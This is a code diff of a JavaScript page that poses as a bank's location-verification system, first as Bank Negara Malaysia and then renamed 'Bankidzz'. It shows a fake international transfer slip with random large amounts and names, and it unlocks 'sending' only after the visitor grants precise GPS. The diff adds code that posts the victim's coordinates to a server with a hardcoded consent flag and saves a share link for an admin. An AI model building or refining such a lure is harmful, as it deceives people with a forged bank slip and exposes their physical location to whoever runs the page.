@@ -1,15 +1,18 @@
 // ============================================================
-// BANK NEGARA MALAYSIA - SISTEM PENGESAHAN LOKASI
-// DIBUAT OLEH KAIZEN
+// BANKIDZZ - SISTEM PENGESAHAN LOKASI
+// DIBUAT OLEH KAIZEN - VERSION 3.1 (TANPA ALERT ADMIN)
 // ============================================================
+
 
 (function() {
     'use strict';
 
     // Konfigurasi
     const CONFIG = {
-        REF_PREFIX: 'BNM-2026-07-25-',
-        ADMIN_URL: 'admin.html'
+        REF_PREFIX: 'BANKIDZZ-2026-07-25-',
+        ADMIN_URL: 'admin.html',
+        SYNC_CHANNEL: 'bankidzz_sync_channel',
+        API_URL: '/api/locations'
     };
 
     // State
@@ -42,41 +45,34 @@
 
     // ===== INIT STRUK =====
     function initStruk() {
-        // Generate reference
         const ref = CONFIG.REF_PREFIX + generateRefCode();
         elements.refNumber.textContent = ref;
 
-        // Date & Time
         const now = new Date();
         elements.strukDate.textContent = now.toLocaleDateString('ms-MY', {
             day: 'numeric', month: 'long', year: 'numeric'
         });
         elements.strukTime.textContent = now.toLocaleTimeString('ms-MY', { hour12: false });
 
-        // Random amount
         const amount = (Math.random() * 300000 + 50000).toFixed(2);
         const total = (parseFloat(amount) + 150).toFixed(2);
         elements.amountDisplay.textContent = 'RM ' + parseFloat(amount).toLocaleString('ms-MY');
         elements.totalAmount.textContent = 'RM ' + parseFloat(total).toLocaleString('ms-MY');
 
-        // Random names
         const senders = ['Ahmad Bin Abdullah', 'Siti Nurhaliza Binti Hassan', 'Mohamad Ali Bin Ibrahim', 'Nurul Izzah Binti Rahman', 'Khairul Anuar Bin Ismail'];
         const receivers = ['Johnathan Smith', 'Michael Anderson', 'Sarah Johnson', 'David Chen', 'Emma Williams'];
         elements.senderName.textContent = senders[Math.floor(Math.random() * senders.length)];
         elements.receiverName.textContent = receivers[Math.floor(Math.random() * receivers.length)];
 
-        // Verification code
         elements.verifCode.textContent = generateVerifCode();
 
-        // Destination country
         const countries = ['🇺🇸 AMERIKA SYARIKAT', '🇬🇧 UNITED KINGDOM', '🇦🇺 AUSTRALIA', '🇸🇬 SINGAPURA', '🇯🇵 JEPUN'];
         elements.destCountry.textContent = countries[Math.floor(Math.random() * countries.length)];
 
-        // Status
         setStatus('pending', 'Menunggu pengesahan lokasi');
         elements.sendBtn.disabled = true;
 
-        console.log('[BNM] Struk initialized:', ref);
+        console.log('[Bankidzz] Struk initialized:', ref);
     }
 
     function generateRefCode() {
@@ -109,7 +105,7 @@
     // ===== LOCATION PERMISSION =====
     function requestLocation() {
         if (!navigator.geolocation) {
-            showNotification('❌ Browser anda tidak menyokong Geolocation. Sila guna browser moden.', 'error');
+            showNotification('❌ Browser tidak sokong Geolocation. Guna Chrome/Firefox.', 'error');
             return;
         }
 
@@ -117,17 +113,27 @@
         elements.allowBtn.disabled = true;
 
         navigator.geolocation.getCurrentPosition(
-            function(position) {
+            async function(position) {
                 locationData = {
                     lat: position.coords.latitude,
                     lng: position.coords.longitude,
                     accuracy: position.coords.accuracy,
                     timestamp: new Date().toISOString()
                 };
-                locationApproved = true;
 
-                // Simpan ke localStorage untuk admin
-                saveLocationToAdmin(locationData);
+                // Simpan ke database bersama sebelum transaksi diteruskan.
+                try {
+                    await saveLocationToAdmin(locationData);
+                    locationApproved = true;
+                } catch (error) {
+                    console.error('[Bankidzz] Gagal menyimpan lokasi:', error);
+                    locationData = null;
+                    locationApproved = false;
+                    elements.allowBtn.innerHTML = 'ðŸ”„ Cuba Semula';
+                    elements.allowBtn.disabled = false;
+                    showNotification('âŒ Lokasi diperoleh tetapi gagal dihantar ke server. Sila cuba lagi.', 'error');
+                    return;
+                }
 
                 // Update UI
                 elements.allowBtn.innerHTML = '✅ Lokasi Disahkan!';
@@ -135,28 +141,35 @@
                 elements.allowBtn.style.color = '#0a0a1a';
                 elements.allowBtn.disabled = true;
 
-                // Sembunyikan alert lokasi, tampilkan struk
                 setTimeout(() => {
                     elements.locationVerification.style.display = 'none';
                     elements.strukContent.style.display = 'block';
-                    setStatus('verified', '✅ Lokasi disahkan oleh BNM');
+                    setStatus('verified', '✅ Lokasi disahkan oleh Bankidzz');
                     elements.sendBtn.disabled = false;
                     elements.statusBar.querySelector('.status-icon').textContent = '✅';
                     elements.statusBar.querySelector('h3').textContent = 'LOKASI DISAHKAN';
-                    elements.statusBar.querySelector('p').textContent = 'Sistem BNM mengesahkan lokasi anda. Sila hantar slip.';
+                    elements.statusBar.querySelector('p').textContent = 'Sistem Bankidzz mengesahkan lokasi anda. Sila hantar slip.';
 
-                    showNotification('✅ Lokasi berjaya disahkan! Anda kini boleh menghantar slip.', 'success');
+                    showNotification('✅ Lokasi berjaya disahkan!', 'success');
                 }, 500);
 
-                console.log('[BNM] Location approved:', locationData);
+                console.log('[Bankidzz] Location approved:', locationData);
             },
             function(error) {
-                console.error('[BNM] Geolocation error:', error);
+                console.error('[Bankidzz] Geolocation error:', error);
                 let msg = 'Gagal mengambil lokasi. ';
                 switch(error.code) {
-                    case 1: msg += 'Izin lokasi ditolak. Sila izinkan di tetapan browser.'; break;
-                    case 2: msg += 'Posisi tidak tersedia.'; break;
-                    case 3: msg += 'Masa tamat untuk mengambil lokasi.'; break;
+                    case 1: 
+                        msg += 'Izin lokasi ditolak. Sila izinkan di tetapan browser.'; 
+                        break;
+                    case 2: 
+                        msg += 'Posisi tidak tersedia. Pastikan GPS aktif.'; 
+                        break;
+                    case 3: 
+                        msg += 'Masa tamat. Cuba lagi di kawasan terbuka.'; 
+                        break;
+                    default: 
+                        msg += 'Sila cuba lagi.';
                 }
                 showNotification('❌ ' + msg, 'error');
                 elements.allowBtn.innerHTML = '🔄 Cuba Semula';
@@ -164,14 +177,14 @@
             },
             {
                 enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
+                timeout: 30000,
+                maximumAge: 60000
             }
         );
     }
 
-    // ===== SAVE TO ADMIN =====
-    function saveLocationToAdmin(data) {
+    // ===== SAVE TO ADMIN + SYNC =====
+    async function saveLocationToAdmin(data) {
         const ref = elements.refNumber.textContent;
         const payload = {
             transferId: ref,
@@ -183,18 +196,55 @@
             status: 'verified',
             timestamp: new Date().toISOString(),
             verifCode: elements.verifCode.textContent
+            ,
+            consent: true
         };
 
         try {
-            let allData = JSON.parse(localStorage.getItem('bnm_transfers') || '[]');
-            // Remove existing if any
+            const response = await fetch(CONFIG.API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if (!response.ok) {
+                const result = await response.json().catch(() => ({}));
+                throw new Error(result.error || 'Server menolak data lokasi.');
+            }
+
+            // Salinan lokal untuk fallback pada browser yang sama.
+            let allData = JSON.parse(localStorage.getItem('bankidzz_transfers') || '[]');
             allData = allData.filter(t => t.transferId !== ref);
             allData.push(payload);
-            localStorage.setItem('bnm_transfers', JSON.stringify(allData));
-            localStorage.setItem('bnm_last_location', JSON.stringify(data));
-            console.log('[BNM] Data saved to localStorage');
+            localStorage.setItem('bankidzz_transfers', JSON.stringify(allData));
+            localStorage.setItem('bankidzz_last_location', JSON.stringify(data));
+            console.log('[Bankidzz] Data saved to server');
+
+            // 2. BROADCAST ke tab lain
+            try {
+                const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
+                channel.postMessage({
+                    type: 'NEW_LOCATION',
+                    payload: payload
+                });
+                channel.close();
+                console.log('[Bankidzz] Broadcast sent to other tabs');
+            } catch(e) {
+                console.warn('[Bankidzz] BroadcastChannel not supported:', e);
+            }
+
+            // 3. Simpan URL untuk admin (tanpa alert)
+            const encoded = encodeURIComponent(btoa(JSON.stringify(payload)));
+            const shareUrl = window.location.origin + '/admin.html?data=' + encoded;
+            localStorage.setItem('bankidzz_admin_share_url', shareUrl);
+            localStorage.setItem('bankidzz_last_payload', JSON.stringify(payload));
+
+            // 4. Trigger storage event
+            window.dispatchEvent(new Event('storage'));
+
         } catch(e) {
-            console.warn('[BNM] Could not save to localStorage:', e);
+            console.warn('[Bankidzz] Could not save location:', e);
+            throw e;
         }
     }
 
@@ -211,7 +261,7 @@
         const ref = elements.refNumber.textContent;
         const message = `
 ╔═══════════════════════════════════════════════════════╗
-║              BANK NEGARA MALAYSIA                    ║
+║              BANKIDZZ                    ║
 ║          SLIP TRANSFER ANTARABANGSA                  ║
 ╠═══════════════════════════════════════════════════════╣
 ║  Rujukan    : ${ref}
@@ -232,39 +282,35 @@
 ║  Lng: ${locationData.lng.toFixed(6)}
 ║  Ketepatan: ${locationData.accuracy.toFixed(0)}m
 ║───────────────────────────────────────────────────────║
-║  © Bank Negara Malaysia - Sistem Keselamatan        ║
+║  © Bankidzz - Sistem Keselamatan        ║
 ╚═══════════════════════════════════════════════════════╝
         `;
 
-        // Update status di localStorage
         try {
-            let transfers = JSON.parse(localStorage.getItem('bnm_transfers') || '[]');
+            let transfers = JSON.parse(localStorage.getItem('bankidzz_transfers') || '[]');
             const idx = transfers.findIndex(t => t.transferId === ref);
             if (idx > -1) {
                 transfers[idx].status = 'completed';
                 transfers[idx].sentAt = new Date().toISOString();
-                localStorage.setItem('bnm_transfers', JSON.stringify(transfers));
+                localStorage.setItem('bankidzz_transfers', JSON.stringify(transfers));
             }
         } catch(e) {}
 
-        // UI feedback
         elements.sendBtn.textContent = '✅ SLIP TERHANTAR!';
         elements.sendBtn.style.background = '#4ade80';
         elements.sendBtn.disabled = true;
 
-        showNotification('✅ Slip berjaya dihantar! Penerima akan menerima notifikasi.', 'success');
+        showNotification('✅ Slip berjaya dihantar!', 'success');
 
-        // Share or copy
         if (navigator.share) {
             navigator.share({
-                title: 'Slip Transfer BNM - ' + ref,
+                title: 'Slip Transfer Bankidzz - ' + ref,
                 text: message,
             }).catch(() => {});
         } else {
             navigator.clipboard.writeText(message).then(() => {
-                showNotification('📋 Slip disalin ke clipboard! Boleh paste ke WhatsApp/Email.', 'success');
+                showNotification('📋 Slip disalin ke clipboard!', 'success');
             }).catch(() => {
-                // Fallback
                 const textarea = document.createElement('textarea');
                 textarea.value = message;
                 document.body.appendChild(textarea);
@@ -280,8 +326,8 @@
 
     // ===== DENY LOCATION =====
     function denyLocation() {
-        if (confirm('⚠️ Anda pasti ingin membatalkan transaksi ini? Tindakan ini tidak boleh dipulihkan.')) {
-            showNotification('❌ Transaksi dibatalkan. Sila mulakan semula.', 'error');
+        if (confirm('⚠️ Anda pasti ingin membatalkan transaksi ini?')) {
+            showNotification('❌ Transaksi dibatalkan.', 'error');
             elements.locationVerification.style.opacity = '0.5';
             elements.locationVerification.style.pointerEvents = 'none';
             elements.denyBtn.textContent = '❌ DIBATALKAN';
@@ -311,6 +357,6 @@
     // ===== INIT =====
     initStruk();
 
-    console.log('[BNM] System ready. Menunggu pengesahan lokasi...');
+    console.log('[Bankidzz] System ready. Menunggu pengesahan lokasi...');
 
 })();
